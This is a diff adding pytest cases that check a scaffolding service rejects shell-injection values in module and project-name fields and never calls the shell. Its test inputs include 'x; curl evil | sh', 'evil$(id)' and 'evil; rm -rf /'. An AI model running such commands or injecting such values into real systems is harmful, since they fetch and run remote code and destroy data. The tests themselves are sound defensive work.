@@ -134,6 +134,72 @@ class TestRunScaffold:
         assert workspace.exists()
 
 
+class TestScaffoldInjectionGuard:
+    @pytest.mark.asyncio
+    async def test_malicious_modules_never_reach_shell(
+        self, scaffold_msg, settings, fake_token, tmp_path
+    ):
+        settings.workspace_base_path = str(tmp_path)
+
+        with patch("src.scaffold.asyncio.create_subprocess_shell") as mock_shell:
+            result = await run_scaffold(
+                project_id=scaffold_msg["project_id"],
+                repository_id=scaffold_msg["repository_id"],
+                template_repo=scaffold_msg["template_repo"],
+                project_name=scaffold_msg["project_name"],
+                modules="x; curl evil | sh",
+                task_description=scaffold_msg["task_description"],
+                repo_full_name="org/my-project",
+                github_token=fake_token,
+                settings=settings,
+            )
+
+        assert result.success is False
+        assert result.error is not None
+        mock_shell.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_malicious_project_name_never_reach_shell(
+        self, scaffold_msg, settings, fake_token, tmp_path
+    ):
+        settings.workspace_base_path = str(tmp_path)
+
+        with patch("src.scaffold.asyncio.create_subprocess_shell") as mock_shell:
+            result = await run_scaffold(
+                project_id=scaffold_msg["project_id"],
+                repository_id=scaffold_msg["repository_id"],
+                template_repo=scaffold_msg["template_repo"],
+                project_name="evil$(id)",
+                modules=scaffold_msg["modules"],
+                task_description=scaffold_msg["task_description"],
+                repo_full_name="org/my-project",
+                github_token=fake_token,
+                settings=settings,
+            )
+
+        assert result.success is False
+        mock_shell.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_ensure_workspace_rejects_malicious_project_name(
+        self, settings, fake_token, tmp_path
+    ):
+        settings.workspace_base_path = str(tmp_path)
+
+        with patch("src.scaffold.asyncio.create_subprocess_shell") as mock_shell:
+            result = await run_ensure_workspace(
+                repository_id="repo-456",
+                project_name="evil; rm -rf /",
+                repo_full_name="org/evil",
+                github_token=fake_token,
+                settings=settings,
+                repo_exists_on_github=True,
+            )
+
+        assert result.success is False
+        mock_shell.assert_not_called()
+
+
 class TestWorkspaceHasFiles:
     def test_nonexistent_dir(self, tmp_path):
         assert _workspace_has_files(tmp_path / "nope") is False
